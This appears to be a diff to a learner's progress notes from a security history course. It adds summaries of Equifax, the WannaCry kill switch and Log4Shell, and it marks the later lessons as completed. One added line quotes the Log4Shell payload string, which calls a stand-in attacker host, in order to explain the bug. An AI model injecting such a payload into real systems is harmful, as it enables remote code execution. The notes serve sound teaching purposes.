@@ -29,10 +29,15 @@
 - **Defense in depth for passwords**: Understands that bcrypt alone is insufficient — you need to reject known-weak passwords at registration (breach lists), add rate limiting for online attacks, and use MFA as a second factor. Correctly identified that offline cracking bypasses server-side rate limiting entirely.
 - **JWT as session optimization**: Understands that tokens exist to avoid re-authenticating on every request. Initially attributed this purely to bcrypt's cost, then refined understanding to include the broader architectural reasons (no DB round-trip, statelessness, horizontal scaling). Knows the pattern: authenticate once (pay bcrypt cost), then carry a signed token.
 
+- **Patch management failures (Equifax)**: Understands how a known, patched vulnerability (Apache Struts CVE-2017-5638) led to a catastrophic breach purely due to organizational failure to apply updates. Grasps that the vulnerability was public for months before exploitation.
+- **Kill switch / domain sinkholing (WannaCry)**: Appreciates Marcus Hutchins' discovery — the unregistered domain that acted as WannaCry's kill switch. Understands the concept of a domain check as a sandbox-evasion technique that accidentally became a global off-switch.
+- **Log4Shell mechanics**: Understands how JNDI lookup interpolation in log message *content* (not just config) turned `logger.info("User: " + input)` into an RCE vector. Grasps that `${jndi:ldap://evil.com/payload}` triggers an outbound LDAP connection, downloads a Java class, and executes it.
+- **JNDI design rationale**: Understands *why* the feature existed — enriching log output with runtime context (hostname, environment) from JNDI naming services — and that the mistake was not distinguishing trusted config from untrusted logged data.
+- **Unifying pattern across the course**: Independently connected Log4Shell to the same structural flaw from lessons 2, 3, and 4: untrusted data interpreted as code in the same channel. SQL injection (user input parsed as SQL), XSS (user input parsed as HTML), Log4Shell (user input parsed as Log4j expressions) — same bug class, same fix principle.
+
 ## Gaps — Not Yet Covered
-- Patch management and vulnerability lifecycle
-- Supply chain / dependency attacks
-- Trust boundaries and input validation (meta-concept)
+- Supply chain / dependency attacks (touched on in discussion of Sep 2025 npm attack, but no dedicated lesson)
+- Trust boundaries and input validation (meta-concept — though demonstrated implicitly across all lessons)
 
 ## Lessons Completed
 - [x] 01 — The Morris Worm (1988) — quiz passed, exploit exercise completed
@@ -41,5 +46,5 @@
 - [x] 04 — The Samy Worm / XSS (2005) — quiz passed
 - [x] 05 — The RockYou Breach (2009) — quiz skipped, concepts demonstrated in discussion
 - [x] 06 — Heartbleed (2014) — lesson read, quiz skipped
-- [ ] 07 — Equifax & WannaCry (2017)
-- [ ] 08 — Log4Shell (2021)
+- [x] 07 — Equifax & WannaCry (2017) — lesson read, quiz skipped
+- [x] 08 — Log4Shell (2021) — lesson read, quiz skipped, JNDI design rationale discussed
